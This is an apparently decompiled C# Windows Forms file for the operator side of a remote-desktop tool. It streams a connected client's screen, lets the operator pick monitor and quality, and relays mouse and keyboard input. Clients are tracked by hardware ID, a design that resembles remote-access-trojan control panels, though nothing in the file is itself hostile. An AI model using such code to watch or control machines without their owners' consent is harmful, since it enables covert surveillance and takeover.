using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormDesktop : FormMaterial
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	private List<Keys> _keysPressed = new List<Keys>();

	public Size screen;

	public Clients client;

	public Clients parrent;

	private Point point2 = new Point(0, 0);

	private const int threshold = 15;

	private int selectedMonitorIndex;

	private IContainer components;

	public MaterialSwitch materialSwitch1;

	public MaterialSwitch materialSwitch2;

	public MaterialSwitch materialSwitch3;

	public MaterialSwitch materialSwitch4;

	public PictureBox pictureBox1;

	private Panel panel1;

	public System.Windows.Forms.Timer timer1;

	public NumericUpDown numericUpDown2;

	private MaterialButton materialButton1;

	public RJComboBox rjComboBox1;

	public FormDesktop()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		pictureBox1.MouseMove += pictureBox1_MouseMove;
		pictureBox1.MouseDown += pictureBox1_MouseDown;
		pictureBox1.MouseUp += pictureBox1_MouseUp;
		pictureBox1.MouseWheel += PictureBox_MouseWheel;
		base.KeyPreview = true;
		pictureBox1.Focus();
		base.KeyDown += FormRemoteDesktop_KeyDown;
		base.KeyUp += FormRemoteDesktop_KeyUp;
		materialButton1.Click += materialButton1_Click;
		rjComboBox1.OnSelectedIndexChanged += rjComboBox1_OnSelectedIndexChanged;
		rjComboBox1.Items.Clear();
		rjComboBox1.Items.Add("Monitor 1");
		if (rjComboBox1.Items.Count > 0)
		{
			rjComboBox1.SelectedIndex = 0;
		}
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color editBack = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (num ? Color.WhiteSmoke : Color.Black);
		BackColor = back;
		panel1.BackColor = back;
		numericUpDown2.BackColor = editBack;
		numericUpDown2.ForeColor = primary;
		rjComboBox1.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox1.BackColor = editBack;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = editBack;
		rjComboBox1.ListTextColor = text;
		materialButton1.ForeColor = text;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			int monitorIndex = ((rjComboBox1.SelectedIndex >= 0) ? rjComboBox1.SelectedIndex : 0);
			client.Send(new object[5]
			{
				"Capture",
				true,
				(byte)numericUpDown2.Value,
				materialSwitch4.Checked,
				monitorIndex
			});
		}
		else
		{
			client.Send(new object[2] { "Capture", false });
		}
	}

	private void numericUpDown2_ValueChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2]
			{
				"Quality",
				(byte)numericUpDown2.Value
			});
		}
	}

	private void materialSwitch4_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2] { "Sharpdx", materialSwitch4.Checked });
		}
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 8;
				}
				client.Send(new object[2] { "MouseClick", b });
			}
		}
		catch
		{
		}
	}

	private void PictureBox_MouseWheel(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				int delta = e.Delta;
				client.Send(new object[2] { "MouseScroll", delta });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 16;
				}
				client.Send(new object[2] { "MouseClick", b });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked && materialSwitch2.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				if (Math.Abs(point.X - point2.X) >= 15 || Math.Abs(point.Y - point2.Y) >= 15)
				{
					point2 = point;
					client.Send(new object[3] { "MouseMove", point.X, point.Y });
				}
			}
		}
		catch
		{
		}
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked && materialSwitch3.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_keysPressed.Add(e.KeyCode);
				client.Send(new object[3]
				{
					"KeyboardClick",
					true,
					(int)e.KeyCode
				});
			}
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked && materialSwitch3.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			client.Send(new object[3]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			});
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void materialButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (pictureBox1.Image == null)
			{
				MessageBox.Show("No image available to save.", "Screenshot", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			}
			string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
			if (!Directory.Exists(downloadsPath))
			{
				downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			}
			string fileName = string.Format("Screenshot_{0}_{1}.png", (client != null) ? client.Hwid : "Unknown", DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss"));
			string filePath = Path.Combine(downloadsPath, fileName);
			using (Bitmap bitmap = new Bitmap(pictureBox1.Image))
			{
				bitmap.Save(filePath, ImageFormat.Png);
			}
			MessageBox.Show($"Screenshot saved successfully!\n\nPath: {filePath}", "Screenshot", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex)
		{
			MessageBox.Show($"Error saving screenshot:\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjComboBox1_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		if (rjComboBox1.SelectedIndex >= 0 && client != null && client.itsConnect)
		{
			selectedMonitorIndex = rjComboBox1.SelectedIndex;
			if (materialSwitch1.Checked)
			{
				client.Send(new object[2] { "Capture", false });
				Thread.Sleep(100);
				client.Send(new object[5]
				{
					"Capture",
					true,
					(byte)numericUpDown2.Value,
					materialSwitch4.Checked,
					selectedMonitorIndex
				});
			}
			else
			{
				client.Send(new object[2] { "SelectMonitor", selectedMonitorIndex });
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch3 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch4 = new MaterialSkin.Controls.MaterialSwitch();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.panel1 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.materialButton1 = new MaterialSkin.Controls.MaterialButton();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 64);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 0;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Enabled = false;
		this.materialSwitch2.Location = new System.Drawing.Point(162, 64);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(106, 37);
		this.materialSwitch2.TabIndex = 1;
		this.materialSwitch2.Text = "Mouse";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch3.AutoSize = true;
		this.materialSwitch3.Depth = 0;
		this.materialSwitch3.Enabled = false;
		this.materialSwitch3.Location = new System.Drawing.Point(273, 64);
		this.materialSwitch3.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch3.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch3.Name = "materialSwitch3";
		this.materialSwitch3.Ripple = true;
		this.materialSwitch3.Size = new System.Drawing.Size(125, 37);
		this.materialSwitch3.TabIndex = 2;
		this.materialSwitch3.Text = "Keyboard";
		this.materialSwitch3.UseVisualStyleBackColor = true;
		this.materialSwitch4.AutoSize = true;
		this.materialSwitch4.Depth = 0;
		this.materialSwitch4.Enabled = false;
		this.materialSwitch4.Location = new System.Drawing.Point(400, 64);
		this.materialSwitch4.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch4.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch4.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch4.Name = "materialSwitch4";
		this.materialSwitch4.Ripple = true;
		this.materialSwitch4.Size = new System.Drawing.Size(109, 37);
		this.materialSwitch4.TabIndex = 3;
		this.materialSwitch4.Text = "DirectX";
		this.materialSwitch4.UseVisualStyleBackColor = true;
		this.materialSwitch4.CheckedChanged += new System.EventHandler(materialSwitch4_CheckedChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.Location = new System.Drawing.Point(6, 104);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(888, 427);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 4;
		this.pictureBox1.TabStop = false;
		this.numericUpDown2.BackColor = System.Drawing.SystemColors.Window;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.Enabled = false;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Location = new System.Drawing.Point(112, 73);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 19;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.numericUpDown2.ValueChanged += new System.EventHandler(numericUpDown2_ValueChanged);
		this.panel1.Controls.Add(this.materialButton1);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(894, 470);
		this.panel1.TabIndex = 20;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.rjComboBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.ListBackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(519, 4);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(200, 30);
		this.rjComboBox1.TabIndex = 24;
		this.rjComboBox1.Texts = "";
		this.materialButton1.AutoSize = false;
		this.materialButton1.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.materialButton1.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.materialButton1.Depth = 0;
		this.materialButton1.HighEmphasis = true;
		this.materialButton1.Icon = null;
		this.materialButton1.Location = new System.Drawing.Point(726, 4);
		this.materialButton1.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.materialButton1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialButton1.Name = "materialButton1";
		this.materialButton1.NoAccentTextColor = System.Drawing.Color.Empty;
		this.materialButton1.Size = new System.Drawing.Size(161, 30);
		this.materialButton1.TabIndex = 25;
		this.materialButton1.Text = "SCREENSHOT";
		this.materialButton1.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.materialButton1.UseAccentColor = false;
		this.materialButton1.UseVisualStyleBackColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(900, 537);
		base.Controls.Add(this.numericUpDown2);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.materialSwitch4);
		base.Controls.Add(this.materialSwitch3);
		base.Controls.Add(this.materialSwitch2);
		base.Controls.Add(this.materialSwitch1);
		base.Controls.Add(this.panel1);
		base.DrawerUseColors = true;
		base.Name = "FormDesktop";
		this.Text = "Desktop";
		base.Load += new System.EventHandler(FormDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		this.panel1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
